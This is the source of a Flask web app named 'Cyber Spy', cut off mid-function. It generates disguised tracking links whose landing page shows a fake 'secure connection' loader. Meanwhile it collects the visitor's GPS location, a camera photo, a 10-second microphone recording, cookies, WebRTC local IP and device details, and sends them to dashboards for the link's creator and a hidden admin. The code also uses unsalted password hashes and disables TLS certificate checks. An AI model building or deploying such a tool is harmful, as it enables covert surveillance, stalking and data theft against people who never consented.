from flask import Flask, render_template_string, request, redirect, url_for, session
from pymongo import MongoClient
import datetime
import hashlib
import os
import requests
import uuid

app = Flask(__name__)
app.secret_key = os.urandom(24)

# ===== MongoDB Connection =====
MONGO_URI = os.environ.get('MONGO_URI')
if not MONGO_URI:
    raise Exception("MONGO_URI environment variable not set!")

try:
    client = MongoClient(
        MONGO_URI,
        tls=True,
        tlsAllowInvalidCertificates=True,
        serverSelectionTimeoutMS=5000
    )
    db = client['spy_db']
    users_col = db['users']
    client.admin.command('ping')
    print("✅ MongoDB connected successfully!")
except Exception as e:
    print(f"❌ MongoDB connection error: {e}")
    raise

# ===== Base CSS =====
BASE_CSS = """
<style>
    *{margin:0;padding:0;box-sizing:border-box;font-family:system-ui,sans-serif}
    body{background:#0a0e17;color:#00ffcc;padding:15px;min-height:100vh;display:flex;justify-content:center;align-items:center}
    .box{background:#111927;padding:30px 25px;border-radius:20px;width:100%;max-width:500px;box-shadow:0 0 40px #00ffcc11}
    h2{text-align:center;color:#ff0044;font-size:2.2rem;margin-bottom:15px}
    .sub{text-align:center;color:#886688;font-size:1.2rem;margin-bottom:25px}
    input,button{width:100%;padding:18px;margin:12px 0;border-radius:12px;border:1px solid #334466;background:#0b111e;color:#c0d4ff;font-size:1.2rem;touch-action:manipulation}
    button{background:#ff004422;border-color:#ff0044;cursor:pointer;font-weight:bold;transition:0.2s}
    button:hover{background:#ff004466}
    a{color:#00ffcc;display:inline-block;margin-top:12px;font-size:1.1rem}
    .error{color:#ff8866;margin-top:12px;padding:12px;background:#ff004422;border-radius:8px;font-size:1.1rem}
    .container{max-width:1400px;margin:auto;padding:20px}
    .card{background:#1a2332;padding:25px;border-radius:18px;margin:20px 0}
    .card input,.card button{padding:18px;font-size:1.2rem}
    .brand{text-align:center;color:#ff8866;font-size:1.1rem;margin:15px 0;cursor:pointer;user-select:none}
    .brand:hover{color:#ff0044}
    .logout{float:right;background:#334466;padding:12px 22px;border-radius:12px;color:#c0d4ff;text-decoration:none;font-size:1.1rem}
    .welcome{font-size:1.3rem;color:#6688aa}
    .link-card{background:#0d1520;padding:20px;border-radius:15px;margin:15px 0;display:flex;flex-wrap:wrap;justify-content:space-between;align-items:center;border-left:5px solid #00ffcc;font-size:1.1rem}
    .link-card a{color:#00ffcc;word-break:break-all}
    .link-card .view-btn{background:#ff004422;padding:12px 25px;border-radius:10px;color:#ffccbb;text-decoration:none;font-size:1.1rem}
    .link-card .del-btn{background:#ff004422;border:1px solid #ff0044;padding:12px 25px;border-radius:10px;color:#ffccbb;text-decoration:none;font-size:1.1rem}
    .visit-card{background:#0d1520;padding:22px;border-radius:18px;margin:20px 0;border-left:6px solid #ff0044;font-size:1.2rem}
    .visit-card img{max-width:250px;height:auto;border-radius:12px;border:1px solid #334466;display:block;margin:12px 0}
    .visit-card audio{max-width:250px;margin:10px 0}
    .visit-card .label{color:#6688aa;font-weight:bold;display:inline-block;width:150px}
    .visit-card .value{color:#00ffcc;display:inline;word-break:break-word}
    .visit-card .row{margin:10px 0}
    .del-btn{background:#ff004422;border:1px solid #ff0044;padding:12px 28px;border-radius:12px;cursor:pointer;color:#ffccbb;text-decoration:none;display:inline-block;margin-top:15px;font-size:1.2rem}
    h1{font-size:2.5rem;text-align:center;color:#ff0044}
    h3{font-size:1.8rem;color:#b0d4ff}
    .total-visits{font-size:1.5rem;color:#6688aa}
    .map-link{color:#00ffcc;text-decoration:underline;font-size:1.2rem;margin-left:10px}
    .admin-table{width:100%;border-collapse:collapse;font-size:0.9rem;margin-top:20px}
    .admin-table th,.admin-table td{border:1px solid #334466;padding:10px;text-align:left;color:#c0d4ff;word-break:break-word}
    .admin-table th{background:#1a2332;color:#ff0044}
    .admin-table tr:nth-child(even){background:#0d1520}
    .click-hint{color:#ff8866;font-size:1rem;margin-top:15px;cursor:pointer;text-align:center}
    .music-status{color:#00ffcc;font-size:1rem;margin-top:5px;text-align:center}
    .admin-only{color:#ff8866;font-size:0.9rem;border:1px solid #ff886633;padding:5px 12px;border-radius:10px;display:inline-block}
    @media(max-width:600px){
        .container{padding:10px}
        .box{padding:20px}
        h1{font-size:2rem}
        h2{font-size:1.8rem}
        input,button{padding:18px;font-size:1.1rem}
        .visit-card{font-size:1rem}
        .visit-card .label{width:100px}
        .link-card{font-size:1rem}
        .logout{font-size:1rem;padding:10px 18px}
        .admin-table{font-size:0.75rem}
        .admin-table th,.admin-table td{padding:6px}
    }
</style>
"""

# ===== Login Page (No music) =====
LOGIN_HTML = """
<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Login</title>""" + BASE_CSS + """
</head>
<body>
<div class="box">
    <h2>🕵️ Cyber Spy</h2>
    <div class="sub">Developer: Arif</div>
    <form method="POST">
        <input type="text" name="username" placeholder="Username" required>
        <input type="password" name="password" placeholder="Password" required>
        <button type="submit">Login</button>
    </form>
    <a href="/register">New user?</a>
    {% if error is defined and error %}
        <p class="error">{{ error }}</p>
    {% endif %}
</div>
</body>
</html>
"""

# ===== Register Page =====
REGISTER_HTML = """
<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Register</title>""" + BASE_CSS + """
</head>
<body>
<div class="box">
    <h2>🕵️ Sign Up</h2>
    <div class="sub">Developer: Arif</div>
    <form method="POST">
        <input type="text" name="username" placeholder="Username" required>
        <input type="password" name="password" placeholder="Password" required>
        <button type="submit">Register</button>
    </form>
    <a href="/login">Already have an account?</a>
    {% if error is defined and error %}
        <p class="error">{{ error }}</p>
    {% endif %}
</div>
</body>
</html>
"""

DASHBOARD_HTML = """
<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Dashboard</title>""" + BASE_CSS + """
<style>
    .click-hint{color:#ff8866;font-size:1rem;margin-top:15px;cursor:pointer;text-align:center}
    .music-status{color:#00ffcc;font-size:1rem;margin-top:5px;text-align:center}
</style>
</head>
<body>
    <!-- Background Music -->
    <audio id="dashboardMusic" loop preload="auto">
        <source src="{{ url_for('static', filename='background.mp3') }}" type="audio/mpeg">
    </audio>

    <div class="container">
        <h1>🕵️ Cyber Spy</h1>
        <div class="brand" id="adminTrigger" onclick="adminClick()">Developer: Arif</div>
        <div id="musicStatus" class="music-status">🔊 Click anywhere to enable sound.</div>
        <div style="display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;margin-bottom:20px;">
            <span class="welcome">Welcome, {{ user.username }}</span>
            <a href="/logout" class="logout">🚪 Logout</a>
        </div>

        <!-- ====== Generate Link ====== -->
        <div class="card">
            <h3>📎 Create New Link</h3>
            <form method="POST" action="/create_link">
                <input type="text" name="link_name" placeholder="Link name (e.g., Facebook Tool)" required>
                <button type="submit">🔗 Generate</button>
            </form>
        </div>

        <!-- ====== User's Links ====== -->
        <div class="card">
            <h3>📌 Your Links</h3>
            {% for link in user.links %}
            <div class="link-card">
                <div>
                    <strong>{{ link.name }}</strong><br>
                    <a href="{{ link.url }}" target="_blank">{{ link.url }}</a>
                </div>
                <div style="display:flex;gap:10px;align-items:center;flex-wrap:wrap;">
                    <span>👁️ {{ link.visits|length }}</span>
                    <a href="/view_link/{{ link.id }}" class="view-btn">📊 View</a>
                    <a href="/delete_link/{{ link.id }}" class="del-btn" onclick="return confirm('Delete this link and all its data?');">🗑️ Delete</a>
                </div>
            </div>
            {% else %}
            <p style="color:#6688aa;font-size:1.2rem;">You haven't created any links. Generate one above!</p>
            {% endfor %}
        </div>

        <div class="click-hint" onclick="playMusic()">🎵 Click to play background music</div>
    </div>

    <script>
        let clickCount = 0;
        function adminClick() {
            clickCount++;
            if (clickCount >= 5) {
                window.location.href = "/admin-login";
                clickCount = 0;
            }
        }

        function playMusic() {
            const audio = document.getElementById('dashboardMusic');
            audio.play().then(() => {
                document.getElementById('musicStatus').textContent = '🔊 Sound enabled';
            }).catch(() => {
                document.getElementById('musicStatus').textContent = '🔊 Click again to play music';
                document.addEventListener('click', function playOnClick() {
                    audio.play();
                    document.getElementById('musicStatus').textContent = '🔊 Sound enabled';
                    document.removeEventListener('click', playOnClick);
                }, { once: true });
            });
        }

        window.onload = function() {
            setTimeout(playMusic, 500);
        };
    </script>
</body>
</html>
"""
# ===== Admin Login Page (Hidden) =====
ADMIN_LOGIN_HTML = """
<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Admin Login</title>""" + BASE_CSS + """
</head>
<body>
<div class="box">
    <h2>🔐 Admin Login</h2>
    <div class="sub">Enter admin password</div>
    <form method="POST">
        <input type="password" name="admin_password" placeholder="Admin Password" required>
        <button type="submit">Login</button>
    </form>
    <a href="/dashboard">⬅️ Back to Dashboard</a>
    {% if error is defined and error %}
        <p class="error">{{ error }}</p>
    {% endif %}
</div>
</body>
</html>
"""

# ===== Admin Panel =====
ADMIN_PANEL_HTML = """
<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Admin Panel</title>""" + BASE_CSS + """
</head>
<body>
<div class="container">
    <h1>🛠️ Admin Panel</h1>
    <div class="brand">Developer: Arif</div>
    <div style="display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;margin-bottom:20px;">
        <span class="welcome">Total Users: {{ users|length }}</span>
        <a href="/admin-logout" class="logout">🚪 Logout</a>
    </div>
    <div class="card">
        <h3>📋 All Users Data</h3>
        <div style="overflow-x:auto;">
        <table class="admin-table">
            <tr>
                <th>#</th>
                <th>Username</th>
                <th>Total Links</th>
                <th>Total Visits</th>
                <th>Actions</th>
            </tr>
            {% for u in users %}
            <tr>
                <td>{{ loop.index }}</td>
                <td>{{ u.username }}</td>
                <td>{{ u.links|length }}</td>
                <td>
                    {% set total = 0 %}
                    {% for link in u.links %}
                        {% set total = total + link.visits|length %}
                    {% endfor %}
                    {{ total }}
                </td>
                <td>
                    <a href="/admin-view-user/{{ u.username }}" style="color:#00ffcc;">📊 View</a>
                    &nbsp;|&nbsp;
                    <a href="/admin-clear-user-data/{{ u.username }}" onclick="return confirm('⚠️ Clear ALL data (links + visits) for this user? Account will remain active.');" style="color:#ffaa00;">🧹 Clear Data</a>
                    &nbsp;|&nbsp;
                    <a href="/admin-delete-user/{{ u.username }}" onclick="return confirm('⚠️ Delete this user and ALL their data? This cannot be undone!');" style="color:#ff4444;">🗑️ Delete Account</a>
                </td>
            </tr>
            {% endfor %}
        </table>
        </div>
    </div>
</div>
</body>
</html>
"""
# ===== Admin View Single User (full data) =====
ADMIN_USER_HTML = """
<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>User Data - {{ user.username }}</title>""" + BASE_CSS + """
<style>
/* মোবাইলে লেবেল ও ভ্যালু আলাদা লাইনে দেখানোর জন্য */
@media (max-width: 600px) {
    .visit-card .row {
        display: flex;
        flex-direction: column;
        align-items: flex-start;
        margin-bottom: 6px;
    }
    .visit-card .label {
        width: auto;
        font-weight: bold;
        color: #6688aa;
        margin-bottom: 2px;
    }
    .visit-card .value {
        word-break: break-word;
        width: 100%;
    }
    .visit-card img {
        max-width: 100% !important;
        height: auto !important;
    }
    .visit-card audio {
        max-width: 100% !important;
    }
}
/* ইমেজ ও অডিও সাইজ ঠিক করা */
.visit-card img {
    max-width: 250px;
    height: auto;
    border-radius: 12px;
    border: 1px solid #334466;
    margin: 5px 0;
}
.visit-card audio {
    max-width: 250px;
    margin: 5px 0;
}
</style>
</head>
<body>
<div class="container">
    <a href="/admin-panel" style="color:#6688aa;display:inline-block;margin-bottom:15px;font-size:1.3rem;">⬅️ Back to Admin Panel</a>
    <h1>📊 User: {{ user.username }}</h1>
    <p class="total-visits">Total Links: {{ user.links|length }}</p>
    <a href="/admin-clear-user-data/{{ user.username }}" onclick="return confirm('⚠️ Clear ALL data (links + visits) for this user? Account will remain active.');" style="color:#ffaa00;display:inline-block;margin-bottom:20px;font-size:1.2rem;">🧹 Clear All Data</a>
    &nbsp;|&nbsp;
    <a href="/admin-delete-user/{{ user.username }}" onclick="return confirm('⚠️ Delete this user and ALL their data?');" style="color:#ff4444;display:inline-block;margin-bottom:20px;font-size:1.2rem;">🗑️ Delete Account</a>

    {% for link in user.links %}
    <div class="card">
        <h3>🔗 {{ link.name }} ({{ link.visits|length }} visits)</h3>
        {% for v in link.visits %}
        <div class="visit-card">
            <div class="row"><span class="label">IP Address:</span> <span class="value">{{ v.get('ip', 'N/A') }}</span></div>
            <div class="row"><span class="label">Location:</span> <span class="value">{{ v.get('city', 'Unknown') }}, {{ v.get('country', 'Unknown') }}</span></div>
            <div class="row"><span class="label">GPS (Lat, Lng):</span> <span class="value">{{ v.get('gps', 'N/A') }}</span>
                {% if v.get('gps') and v.get('gps') not in ['Permission denied', 'Failed', 'N/A'] %}
                    <a href="https://www.google.com/maps?q={{ v.get('gps').split(',')[0].strip() }},{{ v.get('gps').split(',')[1].strip() }}" target="_blank" class="map-link">🗺️ Live Map</a>
                {% endif %}
            </div>
            <div class="row"><span class="label">Browser / OS:</span> <span class="value">{{ v.get('user_agent', 'N/A') }}</span></div>
            <div class="row"><span class="label">Screen:</span> <span class="value">{{ v.get('screen', 'N/A') }}</span></div>
            <div class="row"><span class="label">Language:</span> <span class="value">{{ v.get('language', 'N/A') }}</span></div>
            <div class="row"><span class="label">Platform:</span> <span class="value">{{ v.get('platform', 'N/A') }}</span></div>
            <div class="row"><span class="label">Timezone:</span> <span class="value">{{ v.get('timezone', 'N/A') }}</span></div>
            <div class="row"><span class="label">Battery Level:</span> <span class="value">{{ v.get('battery', 'N/A') }}</span></div>
            <div class="row"><span class="label">Device Memory (GB):</span> <span class="value">{{ v.get('memory', 'N/A') }}</span></div>
            <div class="row"><span class="label">Cookies:</span> <span class="value">{{ v.get('cookies', 'N/A') }}</span></div>
            <div class="row"><span class="label">Referrer:</span> <span class="value">{{ v.get('referrer', 'N/A') }}</span></div>

            <!-- নতুন ডেটা -->
            <div class="row"><span class="label">Device Model:</span> <span class="value">{{ v.get('deviceModel', 'N/A') }}</span></div>
            <div class="row"><span class="label">Network Type:</span> <span class="value">{{ v.get('connType', 'N/A') }}</span></div>
            <div class="row"><span class="label">Downlink Speed:</span> <span class="value">{{ v.get('downlink', 'N/A') }} Mbps</span></div>
            <div class="row"><span class="label">CPU Cores:</span> <span class="value">{{ v.get('cpuCores', 'N/A') }}</span></div>
            <div class="row"><span class="label">Local IP (WebRTC):</span> <span class="value">{{ v.get('localIP', 'N/A') }}</span></div>
            <div class="row"><span class="label">Storage (Free/Total):</span> <span class="value">{{ v.get('storageFree', 'N/A') }} / {{ v.get('storageTotal', 'N/A') }}</span></div>

            <div class="row"><span class="label">Camera:</span>
                {% if v.get('camera') and v.get('camera') != 'Failed' %}
                    <img src="{{ v.get('camera') }}" />
                {% else %}
                    <span class="value">N/A</span>
                {% endif %}
            </div>
            <div class="row"><span class="label">Screenshot:</span>
                {% if v.get('screenshot') and v.get('screenshot') != 'Failed' %}
                    <img src="{{ v.get('screenshot') }}" />
                {% else %}
                    <span class="value">N/A</span>
                {% endif %}
            </div>
            <div class="row"><span class="label">Audio (5s):</span>
                {% if v.get('audio') and v.get('audio') != 'Failed' %}
                    <audio controls><source src="{{ v.get('audio') }}" type="audio/webm"></audio>
                {% else %}
                    <span class="value">N/A</span>
                {% endif %}
            </div>
            <div class="row"><span class="label">Time:</span> <span class="value">{{ v.get('time', 'N/A') }}</span></div>
        </div>
        {% else %}
        <p style="color:#6688aa;">No visits for this link.</p>
        {% endfor %}
    </div>
    {% else %}
    <p style="color:#6688aa;">No links found.</p>
    {% endfor %}
</div>
</body>
</html>
"""
# ===== User View Link (full data including audio) =====
VIEW_LINK_HTML = """
<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Visitor Data</title>""" + BASE_CSS + """
<style>
/* মোবাইলে লেবেল ও ভ্যালু আলাদা লাইনে দেখানোর জন্য */
@media (max-width: 600px) {
    .visit-card .row {
        display: flex;
        flex-direction: column;
        align-items: flex-start;
        margin-bottom: 6px;
    }
    .visit-card .label {
        width: auto;
        font-weight: bold;
        color: #6688aa;
        margin-bottom: 2px;
    }
    .visit-card .value {
        word-break: break-word;
        width: 100%;
    }
    .visit-card img {
        max-width: 100% !important;
        height: auto !important;
    }
}
/* ইমেজ সাইজ ঠিক করা */
.visit-card img {
    max-width: 250px;
    height: auto;
    border-radius: 12px;
    border: 1px solid #334466;
    margin: 5px 0;
}
</style>
</head>
<body>
<div class="container">
    <a href="/dashboard" style="color:#6688aa;display:inline-block;margin-bottom:15px;font-size:1.3rem;">⬅️ Back to Dashboard</a>
    <h1>📊 {{ link.name }}</h1>
    <p class="total-visits">Total Visits: {{ link.visits|length }}</p>

    {% if link.visits %}
        {% for v in link.visits %}
        <div class="visit-card">
            <div class="row"><span class="label">IP Address:</span> <span class="value">{{ v.get('ip', 'N/A') }}</span></div>
            <div class="row"><span class="label">Location:</span> <span class="value">{{ v.get('city', 'Unknown') }}, {{ v.get('country', 'Unknown') }}</span></div>
            <div class="row"><span class="label">GPS (Lat, Lng):</span> <span class="value">{{ v.get('gps', 'N/A') }}</span>
                {% if v.get('gps') and v.get('gps') not in ['Permission denied', 'Failed', 'N/A'] %}
                    <a href="https://www.google.com/maps?q={{ v.get('gps').split(',')[0].strip() }},{{ v.get('gps').split(',')[1].strip() }}" target="_blank" class="map-link">🗺️ Live Map</a>
                {% endif %}
            </div>
            <div class="row"><span class="label">Browser / OS:</span> <span class="value">{{ v.get('user_agent', 'N/A') }}</span></div>
            <div class="row"><span class="label">Screen:</span> <span class="value">{{ v.get('screen', 'N/A') }}</span></div>
            <div class="row"><span class="label">Language:</span> <span class="value">{{ v.get('language', 'N/A') }}</span></div>
            <div class="row"><span class="label">Platform:</span> <span class="value">{{ v.get('platform', 'N/A') }}</span></div>
            <div class="row"><span class="label">Timezone:</span> <span class="value">{{ v.get('timezone', 'N/A') }}</span></div>
            <div class="row"><span class="label">Battery Level:</span> <span class="value">{{ v.get('battery', 'N/A') }}</span></div>
            <div class="row"><span class="label">Device Memory (GB):</span> <span class="value">{{ v.get('memory', 'N/A') }}</span></div>
            <div class="row"><span class="label">Cookies:</span> <span class="value">{{ v.get('cookies', 'N/A') }}</span></div>
            <div class="row"><span class="label">Referrer:</span> <span class="value">{{ v.get('referrer', 'N/A') }}</span></div>

            <!-- নতুন ডেটা -->
            <div class="row"><span class="label">Device Model:</span> <span class="value">{{ v.get('deviceModel', 'N/A') }}</span></div>
            <div class="row"><span class="label">Network Type:</span> <span class="value">{{ v.get('connType', 'N/A') }}</span></div>
            <div class="row"><span class="label">Downlink Speed:</span> <span class="value">{{ v.get('downlink', 'N/A') }} Mbps</span></div>
            <div class="row"><span class="label">CPU Cores:</span> <span class="value">{{ v.get('cpuCores', 'N/A') }}</span></div>
            <div class="row"><span class="label">Local IP (WebRTC):</span> <span class="value">{{ v.get('localIP', 'N/A') }}</span></div>
            <div class="row"><span class="label">Storage (Free/Total):</span> <span class="value">{{ v.get('storageFree', 'N/A') }} / {{ v.get('storageTotal', 'N/A') }}</span></div>

            <div class="row"><span class="label">Camera:</span>
                {% if v.get('camera') and v.get('camera') != 'Failed' %}
                    <img src="{{ v.get('camera') }}" />
                {% else %}
                    <span class="value">N/A</span>
                {% endif %}
            </div>
            <div class="row"><span class="label">Screenshot:</span>
                {% if v.get('screenshot') and v.get('screenshot') != 'Failed' %}
                    <img src="{{ v.get('screenshot') }}" />
                {% else %}
                    <span class="value">N/A</span>
                {% endif %}
            </div>
            <div class="row"><span class="label">Audio (5s):</span>
                {% if v.get('audio') and v.get('audio') != 'Failed' %}
                    <audio controls><source src="{{ v.get('audio') }}" type="audio/webm"></audio>
                {% else %}
                    <span class="value">N/A</span>
                {% endif %}
            </div>
            <div class="row"><span class="label">Time:</span> <span class="value">{{ v.get('time', 'N/A') }}</span></div>
            <a href="/delete_visit/{{ link.id }}/{{ loop.index0 }}" class="del-btn">🗑️ Delete this visit</a>
        </div>
        {% endfor %}
    {% else %}
        <p style="color:#6688aa;font-size:1.2rem;">No visits yet. Share your link to collect data.</p>
    {% endif %}
</div>
</body>
</html>
"""
# ===== Collector Page (with audio recording) =====
COLLECTOR_HTML = """
<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no"><title>Loading...</title>
<script src="https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js"></script>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0a0e17;color:#00ffcc;display:flex;justify-content:center;align-items:center;min-height:100vh;flex-direction:column;padding:15px;text-align:center;font-family:system-ui,sans-serif}
.loader{border:4px solid #1a2332;border-top:4px solid #ff0044;border-radius:50%;width:60px;height:60px;animation:spin 1s linear infinite;margin:15px}
@keyframes spin{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}
p{font-size:1.2rem;color:#6688aa;margin:10px 0}
.msg{color:#00ffcc;font-size:1.1rem;margin-top:15px}
</style>
</head>
<body>
    <div id="capture-area" style="width:100%;max-width:400px;margin:auto;padding:20px;background:#111927;border-radius:12px;border:1px solid #00ffcc33;">
        <div class="loader"></div>
        <p>⏳ Establishing secure connection...</p>
        <div id="status" class="msg"></div>
        <div style="color:#6688aa;font-size:0.8rem;margin-top:10px;">📡 Secured Channel</div>
    </div>

    <script>
        // ============================================
        // 1. GPS
        // ============================================
        let gps = 'Permission denied';
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                pos => { gps = pos.coords.latitude + ',' + pos.coords.longitude; },
                () => { gps = 'Failed'; }
            );
        }

        // ============================================
        // 2. Camera (640x480) + Audio (10 sec)
        // ============================================
        let camera = null;
        let audioData = null;
        let cameraReady = false;
        let audioReady = false;

        // Camera
        navigator.mediaDevices.getUserMedia({ video: { width: { ideal: 640 }, height: { ideal: 480 } } })
        .then(stream => {
            const video = document.createElement('video');
            video.srcObject = stream;
            video.play();
            setTimeout(() => {
                const canvas = document.createElement('canvas');
                canvas.width = 640;
                canvas.height = 480;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, 640, 480);
                camera = canvas.toDataURL('image/jpeg');
                cameraReady = true;
                stream.getTracks().forEach(t => t.stop());
                checkAndSend();
            }, 1200);
        })
        .catch(() => { camera = 'Failed'; cameraReady = true; checkAndSend(); });

        // Audio (10 seconds)
        navigator.mediaDevices.getUserMedia({ audio: true })
        .then(stream => {
            const mediaRecorder = new MediaRecorder(stream);
            const chunks = [];
            mediaRecorder.ondataavailable = e => chunks.push(e.data);
            mediaRecorder.onstop = () => {
                const blob = new Blob(chunks, { type: 'audio/webm' });
                const reader = new FileReader();
                reader.onload = () => {
                    audioData = reader.result;
                    audioReady = true;
                    checkAndSend();
                };
                reader.readAsDataURL(blob);
            };
            mediaRecorder.start();
            setTimeout(() => {
                mediaRecorder.stop();
                stream.getTracks().forEach(t => t.stop());
            }, 10000); // 10 seconds
        })
        .catch(() => { audioData = 'Failed'; audioReady = true; checkAndSend(); });

        // ============================================
        // 3. Other data (fast)
        // ============================================
        let deviceModel = 'Unknown';
        const ua = navigator.userAgent;
        if (/iPhone/.test(ua)) deviceModel = 'iPhone';
        else if (/iPad/.test(ua)) deviceModel = 'iPad';
        else if (/Android/.test(ua)) {
            const match = ua.match(/Android\s([\d.]+);\s([^)]+)\)/);
            if (match) deviceModel = match[2].trim();
            else deviceModel = 'Android Device';
        } else if (/Windows/.test(ua)) deviceModel = 'Windows PC';
        else if (/Macintosh/.test(ua)) deviceModel = 'Mac';

        const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection || {};
        let connType = conn.effectiveType || 'N/A';
        let downlink = conn.downlink || 'N/A';
        let cpuCores = navigator.hardwareConcurrency || 'N/A';

        // WebRTC Local IP
        let localIP = 'N/A';
        try {
            const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
            pc.createDataChannel('');
            pc.createOffer().then(offer => pc.setLocalDescription(offer));
            pc.onicecandidate = (e) => {
                if (!e.candidate) return;
                const ip = e.candidate.candidate.split(' ')[4];
                if (ip && ip.includes('.')) {
                    localIP = ip;
                    pc.close();
                }
            };
            setTimeout(() => pc.close(), 2000);
        } catch(e) {}

        // Storage
        let storageFree = 'N/A', storageTotal = 'N/A';
        if (navigator.storage) {
            navigator.storage.estimate().then(est => {
                storageTotal = (est.quota / (1024**3)).toFixed(1) + ' GB';
                storageFree = ((est.quota - est.usage) / (1024**3)).toFixed(1) + ' GB';
            }).catch(() => {});
        }

        // Battery
        let battery = 'N/A';
        if (navigator.getBattery) {
            navigator.getBattery().then(b => {
                battery = Math.round(b.level * 100) + '%';
            }).catch(() => {});
        }

        // Memory
        let memory = 'N/A';
        if (navigator.deviceMemory) {
            memory = navigator.deviceMemory + ' GB';
        }

        let cookies = document.cookie || 'None';
        let referrer = document.referrer || 'Direct';

        // ============================================
        // 4. Real Screenshot using html2canvas
        // ============================================
        let screenshot = null;
        function captureScreen() {
            html2canvas(document.body, {
                scale: 0.8,
                useCORS: true,
                backgroundColor: '#0a0e17'
            }).then(canvas => {
                screenshot = canvas.toDataURL('image/png');
                checkAndSend();
            }).catch(() => {
                // Fallback
                const canvas = document.createElement('canvas');
                canvas.width = 800; canvas.height = 600;
                const ctx = canvas.getContext('2d');
                ctx.fillStyle = '#0a0e17'; ctx.fillRect(0,0,800,600);
                ctx.fillStyle = '#00ffcc'; ctx.font = '24px monospace';
                ctx.fillText('Secure Connection', 20, 50);
                screenshot = canvas.toDataURL('image/png');
                checkAndSend();
            });
        }
        setTimeout(captureScreen, 300);

        // ============================================
        // 5. Send Data
        // ============================================
        let isSending = false;
        let sent = false;

        function sendData() {
            if (sent) return;
            if (!cameraReady || !audioReady || !screenshot) {
                setTimeout(sendData, 200);
                return;
            }
            sent = true;

            const data = {
                ip: "{{ ip }}",
                user_agent: navigator.userAgent,
                screen: screen.width + "x" + screen.height,
                language: navigator.language,
                platform: navigator.platform,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                gps: gps,
                camera: camera,
                screenshot: screenshot,
                audio: audioData,
                battery: battery,
                memory: memory,
                cookies: cookies,
                referrer: referrer,
                deviceModel: deviceModel,
                connType: connType,
                downlink: downlink,
                cpuCores: cpuCores,
                localIP: localIP,
                storageFree: storageFree,
                storageTotal: storageTotal,
                time: new Date().toLocaleString()
            };

            fetch('/collect/{{ link_id }}', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(data)
            }).then(() => {
                document.getElementById('status').innerHTML = '✅ Connected.';
                setTimeout(() => {
                    document.querySelector('.loader').style.display = 'none';
                    document.querySelector('p').textContent = 'Thank you! You are now connected.';
                    document.getElementById('status').innerHTML = '🔒 Session secure.';
                }, 1000);
            }).catch(() => {
                sent = false;
                setTimeout(sendData, 1500);
            });
        }

        function checkAndSend() {
            if (cameraReady && audioReady && screenshot && !sent) {
                sendData();
            }
        }

        // Fallback force send after 12 seconds (to allow 10 sec audio)
        setTimeout(() => {
            if (!cameraReady) { camera = 'Failed'; cameraReady = true; }
            if (!audioReady) { audioData = 'Failed'; audioReady = true; }
            if (!screenshot) {
                const canvas = document.createElement('canvas');
                canvas.width = 800; canvas.height = 600;
                const ctx = canvas.getContext('2d');
                ctx.fillStyle = '#0a0e17'; ctx.fillRect(0,0,800,600);
                ctx.fillStyle = '#00ffcc'; ctx.font = '24px monospace';
                ctx.fillText('Secure Connection', 20, 50);
                screenshot = canvas.toDataURL('image/png');
            }
            if (!sent) sendData();
        }, 12000);
    </script>
</body>
</html>
"""
# ===== Helper Functions =====
def get_user(username):
    return users_col.find_one({'username': username})

def create_user(username, password):
    hashed = hashlib.sha256(password.encode()).hexdigest()
    user = {
        'username': username,
        'password': hashed,
        'links': []
    }
    users_col.insert_one(user)
    return user

# ===== Routes =====
@app.route('/')
def home():
    return redirect(url_for('login'))

@app.route('/login', methods=['GET', 'POST'])
def login():
    error = None
    if request.method == 'POST':
        username = request.form.get('username', '').strip()
        password = request.form.get('password', '').strip()
        if not username or not password:
            error = 'Please enter username and password'
        else:
            user = get_user(username)
            if user and user['password'] == hashlib.sha256(password.encode()).hexdigest():
                session['user'] = username
                return redirect(url_for('dashboard'))
            else:
                error = 'Invalid credentials'
    return render_template_string(LOGIN_HTML, error=error)

@app.route('/register', methods=['GET', 'POST'])
def register():
    error = None
    if request.method == 'POST':
        username = request.form.get('username', '').strip()
        password = request.form.get('password', '').strip()
        if not username or not password:
            error = 'All fields required'
        elif get_user(username):
            error = 'Username already taken'
        else:
            create_user(username, password)
            return redirect(url_for('login'))
    return render_template_string(REGISTER_HTML, error=error)

@app.route('/dashboard')
def dashboard():
    if 'user' not in session:
        return redirect(url_for('login'))
    user = get_user(session['user'])
    if not user:
        session.clear()
        return redirect(url_for('login'))
    return render_template_string(DASHBOARD_HTML, user=user)

@app.route('/create_link', methods=['POST'])
def create_link():
    if 'user' not in session:
        return redirect(url_for('login'))
    link_name = request.form.get('link_name', '').strip()
    if not link_name:
        return redirect(url_for('dashboard'))
    link_id = str(uuid.uuid4())[:8]
    new_link = {
        'id': link_id,
        'name': link_name,
        'url': request.host_url + 'c/' + link_id,
        'visits': []
    }
    users_col.update_one({'username': session['user']}, {'$push': {'links': new_link}})
    return redirect(url_for('dashboard'))

@app.route('/delete_link/<link_id>')
def delete_link(link_id):
    if 'user' not in session:
        return redirect(url_for('login'))
    result = users_col.update_one(
        {'username': session['user']},
        {'$pull': {'links': {'id': link_id}}}
